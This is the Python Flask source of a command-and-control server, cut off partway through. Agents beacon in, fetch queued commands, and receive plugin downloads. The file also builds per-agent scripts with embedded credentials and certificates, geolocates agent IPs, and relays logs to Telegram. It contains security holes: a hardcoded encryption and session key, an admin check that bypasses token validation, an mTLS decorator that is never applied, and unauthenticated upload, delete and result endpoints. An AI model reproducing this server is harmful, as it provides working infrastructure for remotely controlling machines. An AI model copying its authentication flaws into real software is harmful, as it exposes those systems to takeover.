import os
import json
import subprocess
import uuid
import bcrypt
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory, abort
from werkzeug.utils import secure_filename
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from datetime import datetime, timezone ,timedelta
import sqlite3
from flask import g
import secrets
from functools import wraps
import functools
import logging
import sys
import threading
import time
import folium
import requests
from collections import Counter
import string
import difflib
from google import genai
from pathlib import Path
from bcrypt import hashpw, gensalt, checkpw

app = Flask(__name__)
load_dotenv()
# Configure Flaks terminal colors Correctly
G = "\033[92m"  # Green (2xx)
B = "\033[94m"  # Blue (3xx)
R = "\033[91m"  # Red (4xx & 5xx)
W = "\033[0m"  # White/Reset


class StatusFormatter(logging.Formatter):
    def format(self, record):
        msg = super().format(record)

        # Color logic based on status code patterns
        if " 200 " in msg or " 201 " in msg:
            return f"{G}{msg}{W}"
        elif any(code in msg for code in [" 301 ", " 302 ", " 304 "]):
            return f"{B}{msg}{W}"
        elif any(err in msg for err in [" 400 ", " 404 ", " 500 ", " 503 "]):
            return f"{R}{msg}{W}"

        return msg


# Configure the Werkzeug logger
handler = logging.StreamHandler(sys.stdout)  # Redirects stderr to stdout
handler.setFormatter(StatusFormatter())

werk_log = logging.getLogger('werkzeug')
werk_log.setLevel(logging.INFO)
werk_log.handlers = [handler]
werk_log.propagate = False


# --- Configuration ---

IP = "127.0.0.1"
PORT = 5000
API_KEY = os.getenv("API_KEY")
SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
cipher = Fernet(SECRET_KEY)
app.secret_key = SECRET_KEY
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
client = genai.Client(api_key=GEMINI_API_KEY)
AGENT_ALERT_TIMEOUT = 5
SYSTEM_PROMPT = """
You are a Security Operations Analytics Assistant for a remote agent management system.

Your role is strictly limited to:
- Analyzing system data
- Identifying patterns, anomalies, and trends
- Providing operational insights and risk assessments
- Summarizing system state clearly and concisely

You may use the following data domains:
- Agent metadata (hostname, OS, IP, user, last_seen, agent_group)
- Agent status (online/offline, beacon frequency)
- Task metadata (type, status, success/failure rates, scheduling, recurrence)
- Logs and alerts (info and critical events)
- Authentication activity
- System-wide analytics (distribution, execution metrics)

Rules:
- Do NOT provide instructions, commands, or execution steps
- Do NOT suggest actions that involve interacting with agents or triggering system behavior
- Do NOT reference or recommend any form of remote execution or control mechanisms
- Do NOT generate payloads, commands, or configurations
- Focus ONLY on observation, correlation, and insight

Behavior Guidelines:
- Be concise, precise, and operationally relevant
- Highlight anomalies (e.g. offline agents, failed tasks, irregular beaconing)
- Identify trends (e.g. declining execution rates, group-level issues)
- Correlate events across logs, agents, and tasks when relevant
- Prioritize critical signals over noise
- When data is incomplete, state assumptions clearly

Output Style:
- Short, structured insights
- Use bullet points when appropriate
- Avoid unnecessary explanation
- No speculation beyond available data

Goal:
Provide clear situational awareness and actionable intelligence without performing or suggesting any system interaction.
"""

#Folders & Directories
BASE_DIR = Path.cwd()
DATABASE = "c2.db"
UPLOAD_FOLDER = "./upload"
PLUGINS_DIR = "./plugins"
TOOLS_FOLDER = "tools"
os.makedirs(PLUGINS_DIR, exist_ok=True)
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['TOOLS_FOLDER'] = TOOLS_FOLDER
CERT_DIR = Path("./keys")

def require_mtls(f):
    """
    Decorator: require mTLS authentication

    This decorator checks that Nginx has verified the client certificate.
    Nginx sets X-SSL-Verified and X-Client-Cert-CN headers after successful
    TLS handshake.
    """

    @functools.wraps(f)
    def wrapper(*args, **kwargs):
        # Check if Nginx verified the certificate
        verified = request.headers.get("X-SSL-Verified")
        agent_cert = request.headers.get("X-Client-Cert-CN")

        # Log the request


        # Reject if not verified
        if verified != "SUCCESS":
            abort(403, "Client certificate verification failed")

        # Reject if no identity
        if not agent_cert:
            abort(403, "No client certificate identity")

        # Attach to request context for use in route handlers
        request.agent_cert = agent_cert
        request.agent_dn = request.headers.get("X-Client-Cert-DN")
        request.agent_fingerprint = request.headers.get("X-Client-Fingerprint")

        return f(*args, **kwargs)

    return wrapper


# --- Encryption functions ---
def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()


# ---  Connecting to SQLite DB ---
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()
    if exception:
        app.logger.error(f"Context torn down due to error: {exception}")

#Token Handling
def require_token(role=None):  #  accepts role
    def wrapper(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            #  If role is admin, skip token check entirely
            if role == "admin":
                request.agent_id = None
                request.role = "admin"
                return f(*args, **kwargs)

            token = request.headers.get("TOKEN")

            if not token:
                return jsonify({"error": "Missing token"}), 401

            db = get_db()

            row = db.execute("""
                SELECT t.agent_id, t.expiry, u.role
                FROM tokens t
                JOIN users u ON t.username = u.username
                WHERE t.token = ?
            """, (token,)).fetchone()

            if not row:
                return jsonify({"error": "Invalid token"}), 403

            if datetime.fromisoformat(row["expiry"]) < datetime.utcnow():
                return jsonify({"error": "Token expired"}), 403

            # Role enforcement
            if role and row["role"] != role:
                return jsonify({"error": "Forbidden"}), 403

            request.agent_id = row["agent_id"]
            request.role = row["role"]

            return f(*args, **kwargs)

        return decorated
    return wrapper

# --- Agent beacon endpoint ---
@require_mtls
@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)
    agent_id = beacon_info.get("id")

    db = get_db()
    db.execute("""
        INSERT INTO agents (id, hostname, user, os, ip, last_seen)
        VALUES (?, ?, ?, ?, ?, datetime('now'))
        ON CONFLICT(id) DO UPDATE SET
            hostname=excluded.hostname,
            user=excluded.user,
            os=excluded.os,
            ip=excluded.ip,
            last_seen=datetime('now')
    """, (
        agent_id,
        beacon_info.get("hostname"),
        beacon_info.get("user"),
        beacon_info.get("os"),
        request.remote_addr
    ))
    db.commit()

    # Fetch pending task
    task = db.execute("""
        SELECT uuid, task_json ,scheduled_at FROM tasks
        WHERE agent_id = ? AND output IS NULL
    """, (agent_id,)).fetchall()

    if task:
        formatted_tasks = [
            {
                "task": json.loads(row["task_json"]),
                "uuid": row["uuid"],
                "scheduled_at": row["scheduled_at"]
            }
            for row in task
        ]

        return formatted_tasks

    return []

# --- Live agents API ---
AGENT_ONLINE_TIMEOUT = 30  # seconds

# List all agent data
@app.route("/agents-data")
@require_token(role="admin")
def agents_data():
    now = datetime.now(timezone.utc)

    db = get_db()
    rows = db.execute("SELECT * FROM agents").fetchall()

    data = []
    for row in rows:
        last_seen = datetime.fromisoformat(row["last_seen"])

        # FIX: ensure timezone-aware
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)

        online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT
        pending_tasks = db.execute("""
            SELECT COUNT(*) FROM tasks
            WHERE agent_id = ? AND status = 'pending'
        """, (row["id"],)).fetchone()[0]

        data.append({
            "id": row["id"],
            "hostname": row["hostname"],
            "user": row["user"],
            "os": row["os"],
            "ip": row["ip"],
            "last_seen": last_seen.timestamp(),
            "online": online,
            "pending_tasks": pending_tasks
        })

    return jsonify(data)

# --- Agents page ---
@app.route('/agents/')
@require_token(role="admin")
def agents_list():
    if "username" not in session:
        return redirect(url_for("login"))
    return render_template('agents.html')


# --- Agent detail page ---
@app.route('/agents/<agent_id>')
@require_token(role="admin")
def agent_detail(agent_id):
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    # Fetch all tasks for this agent
    tasks = db.execute("""
        SELECT uuid, task_json, output
        FROM tasks
        WHERE agent_id = ?
        ORDER BY rowid DESC
    """, (agent_id,)).fetchall()

    task_rows = []
    for t in tasks:
        task_rows.append({
            "uuid": t["uuid"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        })

    return render_template('agent_detail.html', agent_id=agent_id, tasks=task_rows)

#Agent Creation Via API
@app.route('/agent-create', methods=['POST'])
@require_token(role="admin")
def agent_create():
    username = request.json.get("username")
    password = request.json.get("password")
    id_number = request.json.get("id")
    agent_group = request.json.get("group")

    db = get_db()
    existing_username = db.execute(
        "SELECT 1 FROM USERS WHERE username = ?",
        (username,)
    ).fetchone()
    existing_agentid = db.execute(
        "SELECT 1 FROM AGENTS WHERE ID = ?",
        (id_number,)
    ).fetchone()
    if existing_agentid:
        return {"error": "AgentID already exists"}, 400
    if existing_username:
        return {"error": "Username already exists"}, 400

    task_uuid = str(uuid.uuid4())
    hashed = bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt())
    db.execute(
        "INSERT INTO USERS (username, password, role) VALUES (?, ?, ?)",
        (username, hashed, "agent")
    )
    db.commit()
    with open("Agent.py", "r") as f_in, open(f"Agent{id_number}.py", "w") as f_out:
        lines = f_in.readlines()

        lines[24] = f'username = "{username}"\n'
        lines[25] = f'password = "{password}"\n'
        lines[30] = f'AGENT_ID = "{id_number}"\n'
        lines[31] = f'AGENT_GROUP = "{agent_group}"\n'

        f_out.writelines(lines)

    log_uuid = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)

    db = get_db()
    db.execute(
        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) VALUES (?, ?, ?, ?, ?,?)",
        (log_uuid, current_time, "administrator",f"Created a new agent: {id_number}", "Info",task_uuid))
    db.commit()

    key = CERT_DIR / f"agent{id_number}.key"
    csr = CERT_DIR / f"agent{id_number}.csr"
    crt = CERT_DIR / f"agent{id_number}.crt"

    # 1. Generate private key
    subprocess.run([
    "openssl", "genpkey",
    "-algorithm", "RSA",
    "-pkeyopt", "rsa_keygen_bits:2048",
    "-out", str(key)
    ], check=True)

# 2. Create CSR with SAN (required for modern TLS)
    subprocess.run([
        "openssl", "req",
        "-new",
        "-key", str(key),
        "-out", str(csr),
        "-subj", f"/C=US/ST=CA/O=TENET/CN={id_number}",
        "-addext", f"subjectAltName=DNS:{id_number}"
    ], check=True)

    # 3. Sign certificate with CA (use SHA-256)
    subprocess.run([
        "openssl", "x509",
        "-req",
        "-in", str(csr),
        "-CA", str(CERT_DIR / "ca.crt"),
        "-CAkey", str(CERT_DIR / "ca.key"),
        "-CAcreateserial",
        "-out", str(crt),
        "-days", "365",
        "-sha256"
    ], check=True)

    return ({"status":"created"}) ,200

# --- Agent result endpoint ---
@app.route('/result', methods=['POST'])
def result():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)

    task_uuid = result_info.get("uuid")
    output = result_info.get("output")
    executed_at = result_info.get("executed_at")
    db = get_db()
    db.execute("""
        UPDATE tasks SET output = ? , executed_at = ? WHERE uuid = ?
    """, (output, executed_at,task_uuid))
    db.commit()

    return jsonify({"status": "received"})

# --- Add a task ---
@app.route('/task', methods=['POST'])
@require_token(role="admin")
def add_task():
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    agent_id = data.get("id")
    command = data.get("task")
    scheduled_at = data.get("scheduled_at")
    recurring_every = data.get("recurring_every")
    agent_group = data.get("agent_group")
    print("agent_group",agent_group)
    task_uuid = str(uuid.uuid4())

    if recurring_every is None:
        recurring_every = "N/A"

    if not agent_group:
        print("agent_group is none")
        db = get_db()
        db.execute("""
            INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
            VALUES (?, ?, ?, NULL, ?, ?)
        """, (task_uuid, agent_id, json.dumps(command),scheduled_at,recurring_every))
        db.commit()

    if agent_group:
        print("agent_group",agent_group)
        db = get_db()
        agents_in_group = db.execute(
            "SELECT id FROM agents WHERE agent_group = ?", (agent_group,)).fetchall()
        for row in agents_in_group:
            task_uuid = str(uuid.uuid4())
            db.execute("""
                    INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
                    VALUES (?, ?, ?, NULL, ?, ?)
                    """, (task_uuid, row[0], json.dumps(command), scheduled_at, recurring_every))
            db.commit()
    if not agent_id and not agent_group is None:
        return jsonify({"status": "Error No Agent ID or GROUP set"}) ,500
    if recurring_every and recurring_every != "N/A":
        thread = threading.Thread(
        target=recurring_scheduler, args=(task_uuid, recurring_every, agent_id, command),daemon=True)
        thread.start()

    log_uuid = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)
    db = get_db()
    db.execute(
        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level,task_id) VALUES (?, ?, ?, ?, ?, ?)",
        (log_uuid, current_time, "administrator",f"Created a new task", "Info",task_uuid))
    db.commit()

    return jsonify({"status": "accepted", "uuid": task_uuid})


def recurring_scheduler(task_uuid,recurring_every,agent_id,command):
    minutes = int(recurring_every)
    seconds = minutes * 60
    time.sleep(seconds)
    with app.app_context():
        while True:
            # 1. Wait first

            # 2. Open a NEW connection for this specific cycle
            # This prevents "Closed Database" and "Thread Sharing" errors
            try:
                # Connect directly using the path to your .db file
                conn = sqlite3.connect('c2.db')
                db = conn.cursor()

                new_uuid = str(uuid.uuid4())
                current_time = datetime.now(timezone.utc)

                db.execute("""
                                SELECT uuid, agent_id, task_json, recurring_every ,output
                                FROM tasks 
                                WHERE recurring_every IS NOT NULL 
                                  AND recurring_every != 'N/A' 
                                  AND recurring_every > 0
                                  AND output IS NULL""")
                task = db.fetchone()
                if task:

                    db.execute("""
                            INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
                            VALUES (?, ?, ?, NULL, ?, NULL)
                        """, (new_uuid, agent_id, json.dumps(command), current_time))


                conn.commit()
                conn.close()  # Always close it so you don't leak connections


                time.sleep(seconds)
            except Exception as e:
                print(f"Error in recurring_scheduler loop: {e}")

def restart_recurring_tasks(app):
    """Finds all recurring tasks in the DB and starts their threads."""
    with app.app_context():
        try:
            conn = sqlite3.connect("c2.db")
            db = conn.cursor()

            # Find tasks that have a recurring interval
            db.execute("""
                            SELECT uuid, agent_id, task_json, recurring_every ,output
                            FROM tasks 
                            WHERE recurring_every IS NOT NULL 
                              AND recurring_every != 'N/A' 
                              AND recurring_every > 0
                              AND output IS NULL""")
            tasks = db.fetchall()
            conn.close()

            if not tasks:
                return

            for task in tasks:
                task_uuid, agent_id, task_json, recurring_every, output= task
                command = json.loads(task_json)  # Convert string back to dict


                # Call your existing scheduler function in a new thread
                thread = threading.Thread(
                    target=recurring_scheduler,
                    args=(task_uuid, recurring_every, agent_id, command),
                    daemon=True
                )
                thread.start()

        except Exception as e:
            print(f"Error resuming tasks: {e}")

# --- File upload ---
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    return f'[+] File {file.filename} successfully uploaded', 200

# Uploaded File Index
@app.route('/uploads/<filename>', methods=['GET', 'DELETE'])
def uploaded_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    if request.method == 'GET':
        # Serve file
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

    elif request.method == 'DELETE':
        # Optionally check authorization/session here
        if not os.path.exists(file_path):
            return jsonify({"error": "File not found"}), 404

        try:
            os.remove(file_path)
            return jsonify({"message": "File deleted successfully"})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route("/files-data")
def files_data():
    files = os.listdir(app.config["UPLOAD_FOLDER"])
    return jsonify(files)

# Uploads
@app.route('/uploads/')
@require_token(role="admin")
def uploads_list():
    if "username" not in session:
        return redirect(url_for("login"))
    files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if os.path.isfile(os.path.join(app.config['UPLOAD_FOLDER'], f))]
    return render_template("uploads.html", files=files)

# Plugins
@app.route('/plugins/')
@require_token(role="admin")
def plugins_list():
    if "username" not in session:
        return redirect(url_for("login"))
    plugins = [f for f in os.listdir(PLUGINS_DIR) if f.endswith(".py")]
    return render_template("plugins.html", plugins=plugins)

# Plugin file Index
@app.route("/plugins/<filename>")
@require_token(role="admin")
def serve_plugin(filename):
    # Only allow .py files
    if not filename.endswith(".py"):
        return "Invalid file", 400
    return send_from_directory(PLUGINS_DIR, filename)

# Plugin run functionality
@app.route('/plugins/run', methods=['POST'])
def run_plugin():
    if "username" not in session:
        return redirect(url_for("login"))

    agent_id = request.form.get("agent_id")
    plugin_name = request.form.get("plugin_name")
    if not agent_id or not plugin_name:
        return "Missing parameters", 400

    # Construct the plugin URL that agent will download
    #plugin_url = f"{request.host_url}plugins/{plugin_name}"
    plugin_url = "https://{IP}/plugins/{plugin_name}".format(IP=IP,plugin_name=plugin_name)
    # Insert task into tasks table
    task_uuid = str(uuid.uuid4())
    db = get_db()
    current_time = datetime.now(timezone.utc)
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output,scheduled_at)
        VALUES (?, ?, ?, NULL,?)
    """, (task_uuid, agent_id, json.dumps({"type": "download", "url": plugin_url}),current_time))
    db.commit()

    log_uuid = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)
    db = get_db()
    db.execute(
        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level,task_id) VALUES (?, ?, ?, ?, ?, ?)",
        (log_uuid, current_time, "administrator",f"Executed plugin : {plugin_name}", "Info",task_uuid))
    db.commit()

    return redirect(url_for('plugins_list'))

def get_client_ip():
    return request.remote_addr

def update_attempts(db, ip, success):
    record = db.execute(
        "SELECT attempts FROM login_attempts WHERE ip = ?",
        (ip,)
    ).fetchone()

    if success:
        db.execute("DELETE FROM login_attempts WHERE ip = ?", (ip,))
        return

    if record:
        db.execute("""
            UPDATE login_attempts
            SET attempts = attempts + 1,
                last_attempt = ?
            WHERE ip = ?
        """, (datetime.now().isoformat(), ip))
    else:
        db.execute("""
            INSERT INTO login_attempts (ip, attempts, last_attempt)
            VALUES (?, 1, ?)
        """, (ip, datetime.now().isoformat()))

MAX_ATTEMPTS = 3
# --- Login / Logout ---
@app.route("/login", methods=["GET", "POST"])
def login():
    db = get_db()
    ip = get_client_ip()

    # Clean expired tokens
    db.execute(
        "DELETE FROM tokens WHERE expiry < ?",
        (datetime.now(timezone.utc).isoformat(),)
    )
    db.commit()

    # Check attempt limit
    record = db.execute(
        "SELECT attempts, last_attempt FROM login_attempts WHERE ip = ?",
        (ip,)
    ).fetchone()

    LOCK_TIME = timedelta(minutes=1)

    if record:
        last = datetime.fromisoformat(record["last_attempt"])
        if datetime.now() - last > LOCK_TIME:
            db.execute("DELETE FROM login_attempts WHERE ip = ?", (ip,))
            db.commit()

    if record and record["attempts"] >= MAX_ATTEMPTS:
        log_uuid = str(uuid.uuid4())
        current_time = datetime.now(timezone.utc)
        db = get_db()
        db.execute(
            "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level,task_id) VALUES (?, ?, ?, ?, ?, ?)",
            (log_uuid, current_time, "None", f"Failed Login 3 Times, IP: {ip}", "Critical", "None"))
        db.commit()
        return "Too many attempts from this IP"

    # -------------------------
    # GET request
    # -------------------------
    if request.method == "GET":
        return render_template("login.html")

    # -------------------------
    # POST request
    # -------------------------
    if request.is_json:
        data = request.get_json(silent=True) or {}
        username = data.get("username")
        password = data.get("password")
        agent_id = data.get("agent_id")
        is_api = True
    else:
        username = request.form.get("username")
        password = request.form.get("password")
        agent_id = None
        is_api = False

    # -------------------------
    # Validate credentials
    # -------------------------
    row = db.execute(
        "SELECT password, role FROM users WHERE username = ?",
        (username,)
    ).fetchone()

    if not row or not bcrypt.checkpw(password.encode("utf-8"), row["password"]):
        update_attempts(db, ip, success=False)
        db.commit()

        if is_api:
            return jsonify({"error": "Unauthorized"}), 401
        return render_template("login.html", error="Invalid credentials")

    role = row["role"]

    # -------------------------
    # ADMIN WEB LOGIN
    # -------------------------
    if not is_api:
        if role != "admin":
            update_attempts(db, ip, success=False)
            db.commit()
            return render_template("login.html", error="Access denied")

        session["username"] = username
        session["role"] = role

        update_attempts(db, ip, success=True)
        db.commit()

        return redirect(url_for("dashboard"))

    # -------------------------
    # API LOGIN
    # -------------------------
    token = secrets.token_hex(32)
    expiry = datetime.utcnow() + timedelta(days=7)

    if agent_id:
        db.execute("DELETE FROM tokens WHERE agent_id = ?", (agent_id,))

        agent = db.execute(
            "SELECT id FROM agents WHERE id = ?",
            (agent_id,)
        ).fetchone()

        if not agent:
            db.execute("""
                INSERT INTO agents (id, hostname, user, os, ip, last_seen,agent_group)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                agent_id,
                data.get("hostname"),
                data.get("user"),
                data.get("os"),
                request.remote_addr,
                datetime.utcnow().isoformat(),
                data.get("agent_group")
            ))
        else:
            db.execute("""
                UPDATE agents
                SET last_seen = ?, ip = ?
                WHERE id = ?
            """, (
                datetime.utcnow().isoformat(),
                request.remote_addr,
                agent_id
            ))

    db.execute("""
        INSERT INTO tokens (token, agent_id, expiry, username)
        VALUES (?, ?, ?, ?)
    """, (token, agent_id, expiry.isoformat(), username))

    # success → reset attempts
    update_attempts(db, ip, success=True)

    db.commit()

    return jsonify({
        "status": "ok",
        "token": token,
        "role": role,
        "expires": expiry.isoformat()
    }), 200

@app.route("/logout")
def logout():
    session.pop("username", None)
    return redirect(url_for("login"))

# Getting the Geolocation of an IP from ip-api.com
def get_location(ip):
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    data = response.json()

    if data['status'] == 'success':
        return data['lat'], data['lon'], data['city'], data['country']
    else:
        return None

def tasks_execution_timestamps(agent_id):
    db = get_db()
    total_agent_tasks = db.execute(
        "SELECT executed_at FROM tasks WHERE agent_id = ?", (agent_id,)
    ).fetchall()

    timestamps = [task[0] for task in total_agent_tasks]

    dates_only = [ts.split(" ")[0] for ts in timestamps if ts is not None]

    date_counts = dict(Counter(dates_only))
    return date_counts

def task_success_rate(agent_id):
    db = get_db()
    agent_status_total = db.execute(
        "SELECT status FROM tasks WHERE agent_id = ?", (agent_id,)
    ).fetchall()

    statuses = [status[0] for status in agent_status_total]
    status_counts = dict(Counter(statuses))
    return status_counts


def get_online_offline_counts():
    db = get_db()
    statuses = []
    rows = db.execute("SELECT id, last_seen FROM agents").fetchall()

    current_time = datetime.now(timezone.utc)

    for row in rows:
        agent_id, ts_str = row[0], row[1]

        if not ts_str:
            statuses.append("offline")
            continue

        try:
            last_activity = datetime.fromisoformat(ts_str)

            if last_activity.tzinfo is None:
                last_activity = last_activity.replace(tzinfo=timezone.utc)

            # Check if last activity was within 30 seconds
            if (current_time - last_activity).total_seconds() <= 30:
                statuses.append("online")
            else:
                statuses.append("offline")
        except ValueError:
            # Fallback if the database has an unexpected string format
            statuses.append("offline")

    # Count each status
    counts = Counter(statuses)

    return {
        "online": counts.get("online", 0),
        "offline": counts.get("offline", 0)
    }

@app.route("/get_piechart_task_success_rate")
def get_piechart_task_success_rate():
    db = get_db()
    # Get all agent IDs
    agents = db.execute("SELECT id FROM agents").fetchall()
    agents = [row[0] for row in agents]
    # Collect all dates across all agents
    all_statuses_set = set()
    agent_status_counts = {}

    for agent_id in agents:
        counts = task_success_rate(agent_id)
        agent_status_counts[agent_id] = counts
        all_statuses_set.update(counts.keys())

    # Sort all dates
    all_statuses = sorted(all_statuses_set)
    return jsonify({
        "statuses": all_statuses,
        "agents": agent_status_counts
    })

@app.route("/get_pie_chart")
def get_pie_chart():
    counts = get_online_offline_counts()
    return jsonify(counts)

@app.route("/get_bar_chart")
def get_bar_chart():
    db = get_db()
    # Get all agent IDs
    agents = db.execute("SELECT id FROM agents").fetchall()
    agents = [row[0] for row in agents]
    # Collect all dates across all agents
    all_dates_set = set()
    agent_date_counts = {}

    for agent_id in agents:
        counts = tasks_execution_timestamps(agent_id)
        agent_date_counts[agent_id] = counts
        all_dates_set.update(counts.keys())

    # Sort all dates
    all_dates = sorted(all_dates_set)
    return jsonify({
        "dates": all_dates,
        "agents": agent_date_counts
    })

@app.route("/get_map")
def get_map():
    ips = ['8.8.8.8','146.70.246.122','104.66.142.148','1.178.95.0']
    db = get_db()
    agent_ip = db.execute("SELECT IP FROM agents").fetchall()
    for row in agent_ip:
        ips.append(row[0])

    # Create base map
    m = folium.Map(location=[20, 0], zoom_start=1)
    for ip in ips:
        ip_result = get_location(ip)
        if ip_result:
            lat, lon, city, country = ip_result

            folium.Marker(
                location=[lat, lon],
                popup=f"{ip} - {city}, {country}"
            ).add_to(m)
    map_html = m._repr_html_()  # key line
    return map_html

@app.route("/info")
@require_token(role="admin")
def info():
    if "username" not in session:
        return redirect(url_for("login"))

    map_html = get_map()  # key line
    return render_template("info.html",map=map_html)
# --- Dashboard ---
@app.route("/dashboard")
@require_token(role="admin")
def dashboard():
    if "username" not in session:
        return redirect(url_for("login"))

    db = get_db()

    files = os.listdir(app.config['UPLOAD_FOLDER'])

    task_rows = db.execute("""
        SELECT uuid, agent_id, task_json, output
        FROM tasks
        ORDER BY rowid DESC
    """).fetchall()

    tasks_str = {}
    for t in task_rows:
        tasks_str[str(t["uuid"])] = {
            "agent_id": t["agent_id"],
            "task": json.loads(t["task_json"]),
            "output": t["output"]
        }

    agents_db = db.execute("SELECT * FROM agents").fetchall()

    now = datetime.now(timezone.utc)
    agent_rows = []

    for agent in agents_db:
        last_seen_dt = datetime.fromisoformat(agent["last_seen"])

        # Ensure timezone-aware
        if last_seen_dt.tzinfo is None:
            last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)

        online = (now - last_seen_dt).total_seconds() <= AGENT_ONLINE_TIMEOUT

        agent_rows.append({
            "id": agent["id"],
            "hostname": agent["hostname"],
            "user": agent["user"],
            "os": agent["os"],
            "ip": agent["ip"],
            "last_seen": last_seen_dt.strftime("%Y-%m-%d %H:%M:%S"),
            "status": "online" if online else "offline"
        })

    return render_template(
        "dashboard.html",
        files=files,
        api_key=API_KEY,
        agents=agent_rows,
        tasks=tasks_str
    )

@app.route("/get_alerts")
@require_token(role="admin")
def get_alerts():
    db = get_db()
    rows = db.execute("""
        SELECT log_id, timestamp, role, log_message, alert_level, task_id
        FROM logs
        ORDER BY timestamp DESC
    """).fetchall()

    tasks_dict = {
        str(t["log_id"]): {
            "log_id": t["log_id"],
            "timestamp": t["timestamp"],
            "role": t["role"],
            "log_message": t["log_message"],
            "alert_level": t["alert_level"],
            "task_id": t["task_id"],
        }
        for t in rows
    }

    return jsonify(tasks_dict)


def send_telegram_logs():
    db = get_db()

    # 1. Fetch only logs that haven't been sent, yet
    # We use 'sent = 0' to find new entries
    rows = db.execute("SELECT * FROM logs WHERE sent = 0").fetchall()

    if rows:
        logs = []
        ids_to_update = []

        for row in rows:
            # Convert row to dict for your list
            log_dict = dict(row)
            logs.append(log_dict)
            # Keep track of the IDs so we can mark them as sent later
            ids_to_update.append(log_dict['log_id'])

        # 2. Format the logs into a single string
        # Using a cleaner format than just str(log) to avoid curly braces in Telegram
        current_time= datetime.now(timezone.utc).strftime("%Y-%m-%d")
        text = f"LOGS FOR {current_time}:\n"+ "\n".join(f"[{log.get('timestamp', 'INFO')}] {log.get('log_message', '')}" for log in logs)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            placeholders = ', '.join(['?'] * len(ids_to_update))
            db.execute(f"UPDATE logs SET sent = 1 WHERE log_id IN ({placeholders})", ids_to_update)
            db.commit()
            print("Telegram message sent!")
        else:
            print("Error sending Telegram message:", response.text)

@app.route("/alerts")
@require_token(role="admin")
def alerts():
    gen_alerts()
    send_telegram_logs()
    return render_template("alerts.html")

def gen_alerts():
    current_time = datetime.now(timezone.utc)

    db = get_db()
    rows = db.execute("SELECT id, last_seen FROM agents").fetchall()

    for row in rows:
        last_seen_datetime = datetime.strptime(row[1], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
        diff = current_time - last_seen_datetime

        if diff >= timedelta(days=AGENT_ALERT_TIMEOUT):
            log_message = f"Agent {row[0]} been offline for more than {AGENT_ALERT_TIMEOUT} days"
            # Use string in YYYY-MM-DD format for safe comparison
            today_str = current_time.strftime("%Y-%m-%d")
            existing = db.execute(
                "SELECT 1 FROM logs WHERE log_message = ? AND DATE(timestamp) = ?",
                (log_message, today_str)
            ).fetchone()


            if not existing:
                log_uuid = str(uuid.uuid4())
                db.execute(
                    "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) VALUES (?, ?, ?, ?, ?, ?)",
                    (log_uuid, current_time, "None", log_message, "Critical", "None")
                )
                db.commit()

    # Low execution success rate logs
    res = get_piechart_task_success_rate()
    statuses = res.json
    results = {}
    agents = statuses.get("agents", {})

    for agent, stats in agents.items():
        success = stats.get("success", 0)
        failure = stats.get("failure", 0)
        pending = stats.get("pending", 0)

        total = success + failure + pending
        rate = int(success / total * 100) if total else 0
        results[agent] = rate

    today_str = current_time.strftime("%Y-%m-%d")

    for r in results:
        if results[r] < 15:
            log_message = f"Low execution success rate for Agent {r}"
            existing = db.execute(
                "SELECT 1 FROM logs WHERE log_message = ? AND DATE(timestamp) = ?",
                (log_message, today_str)
            ).fetchone()

            if not existing:
                log_uuid = str(uuid.uuid4())
                db.execute(
                    "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) VALUES (?, ?, ?, ?, ?, ?)",
